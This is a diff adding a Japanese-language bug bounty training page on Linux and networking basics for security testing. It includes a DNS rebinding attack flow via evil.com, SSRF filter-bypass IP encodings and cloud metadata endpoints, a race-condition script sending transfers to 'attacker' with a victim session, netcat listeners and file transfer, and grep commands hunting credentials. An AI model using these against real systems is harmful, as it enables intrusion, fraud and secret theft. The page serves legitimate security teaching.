@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux & Networking Essentials - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 0: Foundation &gt; Linux & Networking Essentials
+        </div>
+
+        <div class="page-header">
+            <h1>Linux & Networking Essentials</h1>
+            <p class="subtitle">SSRF bypass, DNS rebinding, subdomain takeover, PoC 環境構築に必要なネットワーク基礎知識。</p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-handson">Hands-on</span>
+                <span class="tag tag-practice">Practice</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>DNS (Domain Name System)</h2>
+            <p>
+                ドメイン名を IP アドレスに変換するシステム。BB では subdomain enumeration,
+                DNS rebinding, subdomain takeover の基盤知識として必須。
+            </p>
+
+            <h3>DNS Resolution Flow</h3>
+            <div class="mermaid">
+sequenceDiagram
+    participant C as Your PC
+    participant R as Recursive Resolver<br/>(ISP/8.8.8.8)
+    participant Root as Root Server
+    participant TLD as .com TLD Server
+    participant Auth as example.com<br/>Authoritative
+
+    C->>R: example.com の IP は?
+    R->>Root: example.com は?
+    Root->>R: .com は TLD Server に聞いて
+    R->>TLD: example.com は?
+    TLD->>R: example.com は Auth Server に聞いて
+    R->>Auth: example.com の IP は?
+    Auth->>R: 93.184.216.34 (TTL: 300s)
+    R->>C: 93.184.216.34
+
+    Note over C,R: この結果は300秒キャッシュされる<br/>→ DNS Rebinding はこのTTLを0にして<br/>2回目の解決で別IPを返す
+            </div>
+<pre><code># ユーザーが "app.example.com" にアクセス
+1. Browser → OS Stub Resolver (hosts file, cache 確認)
+2. Stub Resolver → Recursive Resolver (ISP/8.8.8.8/1.1.1.1)
+3. Recursive Resolver → Root Name Server (. → .com の NS を返答)
+4. Recursive Resolver → .com TLD Name Server (example.com の NS を返答)
+5. Recursive Resolver → example.com Authoritative NS (app の A record を返答)
+6. Recursive Resolver → Stub Resolver → Browser (IP address)
+
+# TTL (Time To Live) でキャッシュ。TTL 0 = 毎回問い合わせ → DNS Rebinding に悪用</code></pre>
+
+            <h3>DNS Record Types</h3>
+            <table>
+                <thead><tr><th>Type</th><th>用途</th><th>BB での意味</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>A</strong></td><td>ドメイン → IPv4</td><td>基本の名前解決</td></tr>
+                    <tr><td><strong>AAAA</strong></td><td>ドメイン → IPv6</td><td>IPv4 と異なるサーバーの可能性</td></tr>
+                    <tr><td><strong>CNAME</strong></td><td>別名 (エイリアス)</td><td>Subdomain takeover の判定に重要</td></tr>
+                    <tr><td><strong>MX</strong></td><td>メールサーバー</td><td>フィッシング、内部ドメイン名の露出</td></tr>
+                    <tr><td><strong>TXT</strong></td><td>任意テキスト (SPF, DKIM, verification)</td><td>内部情報の漏洩、SPF misconfiguration</td></tr>
+                    <tr><td><strong>NS</strong></td><td>権威 DNS サーバー</td><td>NS takeover (dangling NS)</td></tr>
+                    <tr><td><strong>SRV</strong></td><td>サービス発見</td><td>内部サービスポート番号の露出</td></tr>
+                </tbody>
+            </table>
+
+            <h3>Subdomain Takeover</h3>
+            <p>
+                CNAME が指す先のサービスが削除されている場合、攻撃者がそのサービスを再登録して
+                ドメインを乗っ取れる。
+            </p>
+<pre><code># 発見方法
+# 1. CNAME を確認
+dig sub.target.com CNAME
+# → sub.target.com CNAME target.herokuapp.com
+
+# 2. CNAME 先にアクセス
+curl https://sub.target.com
+# → "There is no app configured at that hostname" (Heroku)
+# → "NoSuchBucket" (S3)
+# → "unknown domain" (Fastly)  ← 注: CNAME先ではなくvulnerable subdomain自体で確認
+
+# 3. 攻撃者がサービスを登録して sub.target.com を制御
+
+# 脆弱なサービスの signature
+# Heroku: "There is no app configured at that hostname"
+# AWS S3: "NoSuchBucket"
+# GitHub Pages: "There isn't a GitHub Pages site here"
+# Shopify: "Sorry, this shop is currently unavailable"</code></pre>
+
+            <div class="callout">
+                <div class="callout-title">BB視点: Subdomain Takeover の注意点</div>
+                <p>
+                    (1) CNAME 先が unregistered なだけでは不十分。実際に claim できるか確認。<br>
+                    (2) Fastly の場合は CNAME 先 (*.fastly-edge.com) ではなく、vulnerable subdomain 自体に
+                    curl して "unknown domain" が返るかで判定する。<br>
+                    (3) 多くのプログラムで subdomain takeover は accepted だが、severity は Low-Medium が多い。
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>DNS Rebinding</h2>
+            <p>
+                SSRF フィルタをバイパスする高度なテクニック。DNS の応答を時間差で変更することで、
+                最初の検証時は外部 IP、実際のリクエスト時は内部 IP (127.0.0.1 等) を返す。
+            </p>
+
+<pre><code># 攻撃フロー
+1. 攻撃者が evil.com の DNS を制御
+2. アプリに "http://evil.com/api" を fetch させる
+3. アプリの SSRF フィルタ: evil.com を resolve → 1.2.3.4 (外部IP) → OK
+4. DNS TTL = 0 なので即 cache expire
+5. 実際の HTTP request: evil.com を再度 resolve → 127.0.0.1 (内部IP)
+6. アプリは 127.0.0.1 にリクエストを送信 → 内部サービスにアクセス成功
+
+# DNS Rebinding ツール
+# - rbndr.us (テスト用サービス)
+# - singularity (自前 DNS rebinding server)
+# - 1u.ms (A.1u.ms は first query = A, second query = B を返す)</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>TCP/IP Basics</h2>
+
+            <h3>3-Way Handshake</h3>
+<pre><code># TCP 接続確立
+Client → Server: SYN (seq=x)
+Server → Client: SYN-ACK (seq=y, ack=x+1)
+Client → Server: ACK (seq=x+1, ack=y+1)
+
+# BB との関連: Race Condition
+# 複数のリクエストを同時に到着させるには、TCP handshake を先に完了させてから
+# 同時にデータを送信する (single-packet attack / last-byte sync)</code></pre>
+
+            <h3>Race Condition と TCP</h3>
+            <p>
+                PortSwigger の "single-packet attack" は、複数の HTTP request を1つの TCP パケットに
+                詰めることで、サーバー到着時刻の差をナノ秒レベルに縮める。
+                これにより race condition の exploitation が確実になる。
+            </p>
+<pre><code># Burp Suite で Race Condition テスト
+# Repeater → Group タブ → "Send group in parallel"
+# 20-30 リクエストを同時送信して、状態変更の race を検出
+
+# Python (requests + threading)
+import threading
+import requests
+
+def send():
+    requests.post('https://target.com/transfer',
+                  json={'amount': 1000, 'to': 'attacker'},
+                  cookies={'session': 'victim_session'})
+
+threads = [threading.Thread(target=send) for _ in range(20)]
+for t in threads: t.start()
+for t in threads: t.join()</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>TLS/SSL</h2>
+            <p>
+                HTTP 通信の暗号化。証明書の検証、バージョン、cipher suite の設定が対象。
+            </p>
+
+            <h3>TLS Handshake の流れ</h3>
+            <div class="mermaid">
+sequenceDiagram
+    participant C as Client (Browser)
+    participant S as Server
+
+    C->>S: ClientHello (対応する暗号方式一覧)
+    S->>C: ServerHello + 証明書
+    Note over C: 証明書を検証<br/>(CA署名確認, 有効期限, ドメイン一致)
+    C->>S: Pre-master secret (公開鍵で暗号化)
+    Note over C,S: 両者が同じ session key を導出
+    C->>S: 暗号化通信開始
+    S->>C: 暗号化通信
+
+    Note over C,S: 以降の全HTTPは暗号化される<br/>→ 中間者は内容を読めない
+            </div>
+
+            <h3>BB で関連する TLS の問題</h3>
+            <table>
+                <thead><tr><th>問題</th><th>影響</th><th>確認方法</th></tr></thead>
+                <tbody>
+                    <tr><td>Expired certificate</td><td>ユーザーの信頼性低下</td><td>ブラウザの証明書情報</td></tr>
+                    <tr><td>Self-signed cert (production)</td><td>MITM 可能</td><td>通常は Informational</td></tr>
+                    <tr><td>Weak cipher (RC4, DES)</td><td>暗号文の解読</td><td><code>testssl.sh</code></td></tr>
+                    <tr><td>Missing HSTS</td><td>SSL stripping</td><td>Response header 確認</td></tr>
+                    <tr><td>Certificate pinning bypass</td><td>Mobile app intercept</td><td>Frida/Objection</td></tr>
+                </tbody>
+            </table>
+
+<pre><code># TLS 設定の確認
+# testssl.sh (包括的なTLSテスト)
+./testssl.sh https://target.com
+
+# openssl で証明書情報
+openssl s_client -connect target.com:443 -servername target.com
+
+# nmap で cipher enumeration
+nmap --script ssl-enum-ciphers -p 443 target.com</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Firewall / iptables Concepts</h2>
+            <p>
+                SSRF 攻撃で internal network にアクセスする際、何がブロックされ何が通るかを理解する必要がある。
+            </p>
+
+            <h3>SSRF で狙う内部アドレス</h3>
+<pre><code># Private IP ranges (RFC 1918)
+10.0.0.0/8        (10.0.0.0 - 10.255.255.255)
+172.16.0.0/12     (172.16.0.0 - 172.31.255.255)
+192.168.0.0/16    (192.168.0.0 - 192.168.255.255)
+
+# Loopback
+127.0.0.0/8       (127.0.0.1 だけでなく 127.0.0.2 等も有効)
+
+# Link-local
+169.254.0.0/16    (AWS metadata: 169.254.169.254)
+
+# Cloud metadata endpoints
+# AWS: http://169.254.169.254/latest/meta-data/
+# GCP: http://metadata.google.internal/computeMetadata/v1/
+# Azure: http://169.254.169.254/metadata/instance
+
+# SSRF bypass for IP filters
+127.0.0.1 → 0x7f000001 (hex)
+127.0.0.1 → 2130706433 (decimal)
+127.0.0.1 → 0177.0.0.1 (octal)
+127.0.0.1 → 127.1 (short form)
+127.0.0.1 → 0:0:0:0:0:ffff:127.0.0.1 (IPv6 mapped)</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Docker for PoC Environments</h2>
+            <p>
+                BB (特に OSS) では脆弱性の再現環境を Docker で構築して PoC を作成する。
+                安全に destructive テストを行うためにも必須。
+            </p>
+
+            <h3>基本コマンド</h3>
+<pre><code># イメージの取得と起動
+docker pull vulnerable/app:latest
+docker run -d -p 8080:80 --name target vulnerable/app
+
+# コンテナ内でシェル
+docker exec -it target /bin/bash
+
+# docker-compose (複数サービス)
+docker-compose up -d
+docker-compose logs -f app
+docker-compose down -v  # volume も削除
+
+# PoC 用の典型パターン: アプリ + DB + attacker server
+# docker-compose.yml
+services:
+  app:
+    build: ./vulnerable-app
+    ports: ["3000:3000"]
+  db:
+    image: postgres:15
+  attacker:
+    image: python:3.11-slim
+    command: python -m http.server 9999
+    ports: ["9999:9999"]</code></pre>
+
+            <div class="callout">
+                <div class="callout-title">BB視点: Docker PoC の落とし穴</div>
+                <p>
+                    (1) production は外部 DB/Redis を使うが Docker は全てローカル → network 設定の差異に注意<br>
+                    (2) 環境変数のデフォルト値が debug mode → production との fidelity gap に注意<br>
+                    (3) volume の残骸が前回のテスト結果を汚染 → <code>docker-compose down -v</code> で毎回クリーン
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Nmap</h2>
+            <p>
+                ネットワークスキャナ。BB ではターゲットの scope 内サービスの port discovery に使う。
+                ただし scope 外のスキャンは規約違反になるので注意。
+            </p>
+
+<pre><code># 基本スキャン (top 1000 ports)
+nmap -sV target.com
+
+# 全ポートスキャン (時間がかかる)
+nmap -p- target.com
+
+# 特定ポートのバージョン検出
+nmap -sV -p 80,443,8080,8443 target.com
+
+# UDP スキャン (遅い)
+nmap -sU --top-ports 20 target.com
+
+# Script scan (脆弱性検出)
+nmap --script=http-enum,http-headers -p 80,443 target.com
+
+# BB で有用: 隠れた管理画面ポートの発見
+# 8080, 8443, 9090, 3000, 4000, 5000, 6379(Redis), 27017(MongoDB)</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Netcat</h2>
+            <p>
+                TCP/UDP の万能ツール。リバースシェル、ポートリスナー、バナーグラブに使用。
+                BB では主に PoC でのコールバック確認 (OOB interaction) に使う。
+            </p>
+
+<pre><code># バナーグラブ (サービス特定)
+nc -v target.com 80
+HEAD / HTTP/1.1
+Host: target.com
+
+# リスナー (OOB callback 確認)
+nc -lvnp 4444
+# → SSRF/XXE/RCE の PoC で、ターゲットからのコールバックを受信
+
+# ファイル転送
+# 受信側
+nc -lvnp 5555 > received_file
+# 送信側
+nc target.com 5555 < file_to_send
+
+# ポートスキャン (簡易)
+nc -zv target.com 20-100</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Linux コマンド (BB で頻出)</h2>
+<pre><code># DNS 調査
+dig target.com ANY
+dig +short sub.target.com CNAME
+host -t TXT target.com
+
+# HTTP ヘッダー確認
+curl -I https://target.com
+curl -v https://target.com 2>&1 | grep -i "set-cookie\|x-powered\|server"
+
+# サブドメイン列挙 (wordlist ベース)
+# subfinder (passive)
+subfinder -d target.com -o subdomains.txt
+
+# httpx (alive check)
+cat subdomains.txt | httpx -status-code -title -tech-detect
+
+# ファイル/ディレクトリ操作
+find / -name "*.conf" 2>/dev/null  # 設定ファイル探索
+grep -r "password\|secret\|key" /app/ 2>/dev/null  # credential 探索
+
+# プロセスとネットワーク
+ss -tlnp  # listening ports
+ps aux    # running processes
+env       # 環境変数 (credential 漏洩チェック)</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Key Takeaways</h2>
+            <div class="card">
+                <ul>
+                    <li><strong>DNS rebinding</strong> は SSRF IP-based filter の bypass に使える。TTL=0 の DNS を制御する。</li>
+                    <li><strong>Subdomain takeover</strong> は CNAME 先のサービス停止で発生。CNAME + error signature で判定。</li>
+                    <li><strong>Race condition</strong>: TCP single-packet attack (Burp "Send in parallel") で高精度にexploit。</li>
+                    <li><strong>SSRF bypass</strong>: IP 表記の変換 (hex/decimal/octal/IPv6 mapped) でフィルタを回避。</li>
+                    <li><strong>Cloud metadata</strong> (169.254.169.254) は SSRF の最重要ターゲット。credential 取得で Critical。</li>
+                    <li><strong>Docker</strong> は OSS BB の PoC 環境構築に必須。env var のデフォルトに注意。</li>
+                    <li><strong>nmap</strong> は scope 内限定。隠れた管理ポート (8080/8443/9090) の発見に有効。</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>WSA Labs</h2>
+            <ul>
+                <li><a href="https://portswigger.net/web-security/ssrf" target="_blank">SSRF labs</a> (IP bypass, DNS rebinding)</li>
+                <li><a href="https://portswigger.net/web-security/race-conditions" target="_blank">Race condition labs</a></li>
+                <li><a href="https://portswigger.net/web-security/xxe" target="_blank">XXE labs</a> (network interaction)</li>
+            </ul>
+        </div>
+
+        <div style="text-align:center; margin: 2rem 0;">
+            <button class="complete-btn" data-module-id="06-linux" onclick="toggleComplete('06-linux')">Mark Complete</button>
+        </div>
+
+        <div class="page-nav">
+            <a href="05-tools-setup.html">&larr; 前: Tools Setup & Workflow</a>
+            <a href="10-xss.html">次: (Phase 1) XSS &rarr;</a>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+    <script>mermaid.initialize({startOnLoad:true,theme:'dark',themeVariables:{primaryColor:'#1f2a3f',primaryTextColor:'#e6edf3',primaryBorderColor:'#30363d',lineColor:'#58a6ff',secondaryColor:'#161b22',tertiaryColor:'#161b22'}});</script>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
